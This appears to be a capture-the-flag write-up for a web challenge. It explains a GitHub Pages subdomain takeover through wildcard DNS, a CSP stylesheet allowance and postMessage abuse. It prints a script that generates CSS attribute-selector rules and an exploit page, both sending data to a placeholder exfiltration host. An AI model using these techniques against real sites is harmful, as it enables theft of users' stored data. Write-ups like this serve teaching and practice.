<h1>Undocumented js-api</h1>

<h2>Description</h2>

<blockquote>
  <p>I asked my web developer friend to create a secure app for storing my HTML notes, but he left halfway through the project. If you find any bugs in the app, just report it to me at netcat url.</p>
</blockquote>

<h2>Solution</h2>

<h3>Initial Analysis</h3>

<p>The challenge was hosted at <code>https://chall1.jsapi.tech</code>, which we can easily tell is a GitHub pages site.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-28 at 2.42.03 PM.png" alt=""><figcaption></figcaption></figure>

<p>The page provides an interface to write and save notes in HTML. This is implemented by the <code>script.js</code> script.</p>

<p>{% tabs %}
{% tab title="index.html" %}
<code>markup
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;HTML Tester&lt;/title&gt;
    &lt;link rel="preconnect" href="https://fonts.googleapis.com"&gt;
    &lt;link rel="preconnect" href="https://fonts.gstatic.com" crossorigin&gt;
    &lt;link href="./style.css" rel="stylesheet"&gt;
    &lt;meta http-equiv="Content-Security-Policy" content="script-src 'self' cdnjs.cloudflare.com; object-src 'none'; frame-src 'none'; style-src 'self' fonts.googleapis.com *.jsapi.tech;"&gt;
    &lt;link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400;1,500&amp;display=swap" rel="stylesheet"&gt;
    &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.3.0/purify.min.js" integrity="sha512-FJzrdtFBVzaaehq9mzbhljqwJ7+jE0GyTa8UBxZdMsMUjflR25f5lJSGD0lmQPHnhQfnctG0B1TNQsObwyJUzA==" crossorigin="anonymous" referrerpolicy="no-referrer"&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="wrapper"&gt;
      &lt;header id="header-section"&gt;
      &lt;h1&gt;HTML Notes&lt;/h1&gt;
      &lt;h2&gt;Test your latest HTML based creations and save them to show to your friends later.&lt;/h2&gt;
      &lt;/header&gt;
      &lt;form id="note" method="post" action="/html_note"&gt;
        &lt;div id="note-text-area-wrapper"&gt;&lt;textarea id="note-text-area" name="note"&gt;&lt;/textarea&gt;&lt;/div&gt;
        &lt;div id="submit-wrapper"&gt;&lt;button type="submit" id="note-submit"&gt;Save and render&lt;/button&gt;&lt;button id="note-go-back"&gt;Get last render&lt;/button&gt;&lt;/div&gt;
        &lt;!-- // TODO:(sohom) Implement these before the next update load data from print.jsapi.live --&gt;
        &lt;!-- &lt;div id="print-wrapper"&gt;&lt;button type="submit" id="note-print-preview"&gt;Preview Print&lt;/button&gt;&lt;button id="note-print"&gt;Print&lt;/button&gt;&lt;/div&gt; --&gt;
      &lt;/form&gt;
      &lt;div id="output"&gt;&lt;/div&gt;
      &lt;footer id="ad"&gt;We are also working on a experimental iframe-based JS API. Feel free check it out and report any issues you face.&lt;/footer&gt;
    &lt;/div&gt;
    &lt;script src="./script.js"&gt;
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code>
{% endtab %}</p>

<p>{% tab title="script.js" %}
<code>javascript
'use strict';
window.addEventListener("load", () =&gt; {
  window.a = "*";
  const onmessage = (name) =&gt; {
    return window.parent.postMessage(name, window.a);
  };
  const parseUrl = (url) =&gt; {
    //return (new URL(url)).host.endsWith(".jsapi.tech");
    return true
  };
  const el_form_login_form = document.getElementById("note");
  const parsed = document.getElementById("note-text-area");
  const tmp = document.getElementById("output");
  const back = document.getElementById("note-go-back")
  const preview_print = document.getElementById("note-print-preview");
  const printBtn = document.getElementById("note-print");
  const self = new class {
    constructor() {
      this.note = window.localStorage.getItem("note") || null;
    }
    set(str) {
      console.log(`NOTE_APP_SETTER_CALL ${str}`);
      window.localStorage.setItem("note", str);
      var bookmarkName = DOMPurify.sanitize(str, {ADD_TAGS: ['link','style']}); // allow CSS
      tmp.innerHTML = bookmarkName;
      parsed.setAttribute( 'data-last', self.get() );
      this.note = str;
      parsed.value = str;
    }
    get() {
      return console.log("NOTE_APP_GETTER_CALL"), this.note || parsed.getAttribute( 'data-last' ) || window.localStorage.getItem("note");
    }
    goBack() {
      this.set( parsed.getAttribute( 'data-last' ) );
    }
  };
  el_form_login_form.addEventListener("submit", (event) =&gt; {
    return event.preventDefault(), event = parsed.value, self.set(event), false;
  });
  back.addEventListener("click", (event) =&gt; {
    event.preventDefault();
    self.goBack();
  });
  self.set(self.get());
  window.addEventListener("beforeunload", () =&gt; {
    onmessage("NOTE_APP_API_UNLOADED");
  });
  const urlInstance = new URL(window.location.href);
  return ("true" === urlInstance.searchParams.get("enableapi") &amp;&amp; parseUrl(urlInstance.searchParams.get("recv")) &amp;&amp; window.parent || window.opener) &amp;&amp; (onmessage("NOTE_APP_API_LOADED"), window.a = urlInstance.searchParams.get("recv"), window.addEventListener("message", async(event) =&gt; {
    var factor_text;
    if (parseUrl(event.origin)) {
      if ("string" == typeof event.data) {
        if (event.data.startsWith("NOTE_APP_FLAG_REQUEST")) {
          onmessage("NOTE_APP_EXPERIMENTAL_API_CALL_MADE");
          //factor_text = (await fetch("file:///flag.txt")).text;
          factor_text = "flag{fake}"
          if (!(event.source === window)) {
            onmessage("You need to try a bit harder...");
          }
          onmessage("NOTE_APP_FLAG_REQUEST_RESPONSE " + factor_text);
        } else {
          if (event.data.startsWith("NOTE_APP_SET_REQUEST")) {
            onmessage("NOTE_APP_EXPERIMENTAL_API_CALL_MADE ");
            const [a, ...b] = event.data.split(" ");
            self.set(b.join(' '));
          }
        }
      }
    } else {
      onmessage("NOTE_APP_UNTRUSTED_ORIGIN");
    }
  })), false;
});
</code>
{% endtab %}
{% endtabs %}</p>

<p>Analyzing the JavaScript source, we see that a <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/message_event">message event</a> handler is only added to the window if several conditions are met.</p>

<p>{% code overflow="wrap" %}
```javascript
const onmessage = (name) =&gt; {
    return window.parent.postMessage(name, window.a);
};
const parseUrl = (url) =&gt; {
    return (new URL(url)).host.endsWith(".jsapi.tech");
};</p>

<p>...</p>

<p>return ("true" === urlInstance.searchParams.get("enableapi") &amp;&amp; parseUrl(urlInstance.searchParams.get("recv")) &amp;&amp; window.parent || window.opener) &amp;&amp; (onmessage("NOTE<em>APP</em>API_LOADED"), window.a = urlInstance.searchParams.get("recv"), window.addEventListener("message", async(event) =&gt; {</p>

<pre><code>...
</code></pre>

<p>})), false;
```
{% endcode %}</p>

<p>This is a very long line of code that</p>

<ul>
<li>checks if the <code>enableapi</code> query parameter is set to <code>true</code></li>
<li>checks if the <code>recv</code> query parameter is a subdomain of <code>jsapi.tech</code></li>
<li>checks if the window is framed or opened by another window</li>
<li>sets <code>window.a</code> to the <code>recv</code> query parameter</li>
<li>finally, adds the message event handler</li>
</ul>

<p>Next, we see that <code>parseUrl</code> is called on <code>event.origin</code>. In order to pass this check, the origin that our <code>postMessage</code> call comes from must be a subdomain of <code>jsapi.tech</code>.</p>

<p>```javascript
var factor_text;
if (parseUrl(event.origin)) {</p>

<p>...</p>

<p>} else {
  onmessage("NOTE<em>APP</em>UNTRUSTED_ORIGIN");
}
```</p>

<h3>Subdomain Takeover</h3>

<p>This part is similar to <a href="../../2021/uiuctf-2021/yana.md">Yana from UIUCTF 2021</a>. Because a wildcard configuration is used (i.e. <code>*.jsapi.tech</code>), <em>any</em> <code>.jsapi.tech</code> subdomain would point to <code>sohomdatta1.github.io</code>.</p>

<p>To confirm this, we just have to use <code>dig</code> on any <code>.jsapi.tech</code> subdomain that currently does not have an associated GitHub pages site.</p>

<p>```
$ dig asdf.jsapi.tech</p>

<p>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; asdf.jsapi.tech
;; global options: +cmd
;; Got answer:
;; ->&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 35437
;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1</p>

<p>;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;asdf.jsapi.tech.       IN  A</p>

<p>;; ANSWER SECTION:
asdf.jsapi.tech.    28800   IN  CNAME   sohomdatta1.github.io.
sohomdatta1.github.io.  3600    IN  A   185.199.111.153
sohomdatta1.github.io.  3600    IN  A   185.199.108.153
sohomdatta1.github.io.  3600    IN  A   185.199.109.153
sohomdatta1.github.io.  3600    IN  A   185.199.110.153</p>

<p>;; Query time: 353 msec
;; SERVER: 192.168.50.1#53(192.168.50.1)
;; WHEN: Wed Dec 28 20:43:09 +08 2022
;; MSG SIZE  rcvd: 143
```</p>

<p>From GitHub's <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site">documentation</a>, users are explicitly warned against using wildcard DNS records to prevent subdomain takeovers.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-28 at 8.53.12 PM.png" alt=""><figcaption></figcaption></figure>

<p>When requesting for <code>asdf.jsapi.tech</code>, GitHub tries to find a matching repository with a <code>CNAME</code> file containing <code>asdf.jsapi.tech</code>. Because no such repository currently exists, <em>anyone</em> can create a new repository with this <code>CNAME</code> file and serve a GitHub pages site at <code>asdf.jsapi.tech</code>.</p>

<h3>Aside: Stealing Exploits</h3>

<p>I'm not sure if the challenge initially took this into account, but services like <a href="https://crt.sh/">crt.sh</a> allow users to search for certificates issued by major certificate authorities (CAs) by scraping their transparency logs. Using crt.sh, I was able to find all the subdomains created by other players attempting the challenge.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-28 at 9.08.59 PM.png" alt=""><figcaption></figcaption></figure>

<p>At the time of solving, there were two other solvers. Making an educated guess landed me on <code>squ1rrel</code>'s exploit page, <code>squ1rrel.jsapi.tech</code>, where I pretty much found the flag and a working PoC. For completeness, I'll explain the exploit anyway :)</p>

<h3>CSS Injection</h3>

<p>Taking a closer look at the JavaScript source, we see that when a note is saved and <code>self.set()</code> is called, the note's contents go into the <code>data-last</code> attribute of the <code>#note-text-area</code> element.</p>

<p>Additionally, DOMPurify v2.3.0 is used to sanitize our note, with <code>link</code> and <code>style</code> tags being explicitly allowed.</p>

<p>```javascript
const el<em>form</em>login<em>form = document.getElementById("note");
const parsed = document.getElementById("note-text-area");
const tmp = document.getElementById("output");
const back = document.getElementById("note-go-back")
const preview</em>print = document.getElementById("note-print-preview");
const printBtn = document.getElementById("note-print");</p>

<p>...</p>

<p>const self = new class {
  constructor() {
    this.note = window.localStorage.getItem("note") || null;
  }
  set(str) {
    console.log(<code>NOTE_APP_SETTER_CALL ${str}</code>);
    window.localStorage.setItem("note", str);
    var bookmarkName = DOMPurify.sanitize(str, {ADD<em>TAGS: ['link','style']}); // allow CSS
    tmp.innerHTML = bookmarkName;
    parsed.setAttribute( 'data-last', self.get() );
    this.note = str;
    parsed.value = str;
  }
  get() {
    return console.log("NOTE</em>APP<em>GETTER</em>CALL"), this.note || parsed.getAttribute( 'data-last' ) || window.localStorage.getItem("note");
  }
  goBack() {
    this.set( parsed.getAttribute( 'data-last' ) );
  }
};
```</p>

<p>We can send a <code>postMessage</code> starting with <code>NOTE_APP_SET_REQUEST</code> to save a note, allowing us to insert DOMPurify-sanitized HTML into the child iframe.</p>

<p><code>javascript
if (event.data.startsWith("NOTE_APP_SET_REQUEST")) {
  onmessage("NOTE_APP_EXPERIMENTAL_API_CALL_MADE ");
  const [a, ...b] = event.data.split(" ");
  self.set(b.join(' '));
}
</code></p>

<p>The Content Security Policy (CSP) is quite restrictive, but one part stands out - stylesheets can be loaded from <code>*.jsapi.tech</code>, allowing us to load a CSS file from our exploit domain.</p>

<p>{% code overflow="wrap" %}
<code>html
script-src 'self' cdnjs.cloudflare.com; object-src 'none'; frame-src 'none'; style-src 'self' fonts.googleapis.com *.jsapi.tech;
</code>
{% endcode %}</p>

<p>By the way, because a tag like <code>&lt;link&gt;</code> will get <a href="https://github.com/cure53/DOMPurify/issues/257">removed</a> by the browser if it's the first thing in the HTML, passing <code>&lt;link rel="stylesheet" href="..."&gt;</code> to DOMPurify will just return an empty string. However, adding anything <em>before</em> the <code>&lt;link&gt;</code> tag fixes this behaviour. For example, I will use <code>asdf&lt;link rel="stylesheet" href="..."&gt;</code>.</p>

<p>Since we are interested in the victim's saved note, we can exfiltrate the <code>data-last</code> attribute of the <code>#note-text-area</code> element using <a href="https://www.w3schools.com/css/css_attribute_selectors.asp">CSS attribute selectors</a>.</p>

<p>For instance, the URL specified in the <code>background</code> of the following CSS rule is only fetched if the <code>data-last</code> attribute starts with the string <code>nite{a</code>.</p>

<p><code>css
textarea[data-last^='nite{a'] {
    background: url("https://EXFIL.x.pipedream.net/?data=nite%7Ba");
}
</code></p>

<p>This can be extended to bruteforce all possible characters in each position of the flag, with each character having a background URL corresponding to the guessed flag.</p>

<p>To generate the CSS I used the following script.</p>

<p>```python
import string
import urllib.parse</p>

<p>ENDPOINT = "https://EXFIL.x.pipedream.net/"
CURR<em>FLAG = "nite{n0w</em>we<em>kn0w</em>h0w<em>10</em>h4ck<em>g00gl6</em>w1th<em>c5"
CHARSET = string.ascii</em>letters + string.digits + "_-{}"</p>

<p>css = ""</p>

<p>for char in CHARSET:
    css += f"""
textarea[data-last^='{CURR<em>FLAG + char}'] {{
    background: url("{ENDPOINT}?data={urllib.parse.quote</em>plus(CURR_FLAG + char)}");
}}
    """</p>

<p>with open("exploit.css", "w") as f:
    f.write(css)</p>

<p>```</p>

<p>Our exploit page will simply load the challenge page as an <code>iframe</code>, wait for the API to be loaded, then send a <code>postMessage</code> linking the CSS we created above to the target page. This is added to a GitHub repository together with the CSS, and deployed to GitHub pages under a <code>.jsapi.tech</code> subdomain.</p>

<p>```markup
<html>
    <iframe src="https://chall1.jsapi.tech?enableapi=true&amp;recv=https://zeyu.jsapi.tech"></iframe>
    <script>
        const frame = document.querySelector('iframe');</p>

<pre><code>    window.addEventListener('message', (event) =&gt; {
        fetch("https://EXFIL.x.pipedream.net?" + event.data);

        if (event.data.includes("NOTE_APP_API_LOADED")) {
            frame.contentWindow.postMessage(
                `NOTE_APP_SET_REQUEST asdf&lt;link rel="stylesheet" href="https://zeyu.jsapi.tech/exploit.css?t=${Math.random()}"&gt;&lt;/link&gt;`,
                "*"
            );
        }
    });
&lt;/script&gt;
</code></pre>

<p></html>
```</p>

<p>Exfiltrating each character is slightly annoying, as it involves redeploying our exploit GitHub page with the updated CSS.</p>
